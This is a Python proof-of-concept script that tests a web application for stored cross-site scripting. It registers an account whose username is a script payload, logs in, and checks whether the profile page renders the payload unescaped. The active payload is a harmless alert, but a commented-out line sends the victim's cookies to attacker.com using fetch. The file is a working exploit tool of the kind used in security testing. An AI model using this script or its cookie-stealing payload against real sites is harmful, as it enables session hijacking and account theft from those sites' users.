#!/usr/bin/env python3

import requests
import sys
import re

def xss_poc(base_url):
    print("\n[*] Cross-Site Scripting (XSS) Proof of Concept")
    print("[*] This PoC demonstrates stored XSS via the username field")
    
    # The vulnerable endpoints
    register_url = f"{base_url}/register"
    login_url = f"{base_url}/login"
    profile_url = f"{base_url}/profile"
    
    # XSS payload - in a real attack, this could steal cookies, redirect users, etc.
    # For demonstration, we'll use a simple alert
    xss_payload = "<script>alert('XSS Vulnerability Demonstrated!')</script>"
    
    # More advanced payload that would steal cookies and send them to an attacker's server
    # xss_payload = "<script>fetch('https://attacker.com/steal?cookie='+encodeURIComponent(document.cookie));</script>"
    
    print(f"\n[+] Registering new user with XSS payload: {xss_payload}")
    register_data = {
        "username": xss_payload,
        "password": "Password123!"
    }
    
    # Register the user with the XSS payload
    response = requests.post(register_url, data=register_data)
    
    if "Username already exists" in response.text:
        print("[!] User with XSS payload already exists, continuing with login")
    elif "/login" in response.url:
        print("[+] Successfully registered user with XSS payload")
    else:
        print("[-] Failed to register user with XSS payload")
        print(f"[-] Response: {response.text[:100]}...")
    
    # Login with the XSS payload user
    print("\n[+] Logging in with the XSS payload user...")
    login_data = {
        "username": xss_payload,
        "password": "Password123!"
    }
    
    response = requests.post(login_url, data=login_data)
    
    if "/profile" in response.url:
        print("[+] Successfully logged in with XSS payload user")
        cookies = response.cookies
        
        # Now check if the XSS payload is reflected in the profile page
        profile_response = requests.get(profile_url, cookies=cookies)
        
        # Check if our script tag is in the response without being escaped
        if xss_payload in profile_response.text:
            print("[!] XSS VULNERABILITY CONFIRMED!")
            print("[+] The script tag was not escaped and would execute in a real browser")
            
            # Extract the vulnerable HTML context
            html_snippet = re.search(r'<h1>Welcome, (.+?)</h1>', profile_response.text)
            if html_snippet:
                print("\n[+] Vulnerable HTML context:")
                print(f"    {html_snippet.group(0)}")
                
            print("\n[+] In a real browser, this would:")
            print("    1. Execute the JavaScript code when the page loads")
            print("    2. Display an alert dialog with the message")
            print("    3. In a real attack, it could steal cookies, redirect users, or perform actions as the user")
        else:
            print("[-] XSS payload was escaped or removed - target might be patched")
    else:
        print("[-] Failed to login with XSS payload user")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <base_url>")
        print(f"Example: {sys.argv[0]} http://localhost:5000")
        sys.exit(1)
        
    base_url = sys.argv[1].rstrip('/')
    xss_poc(base_url)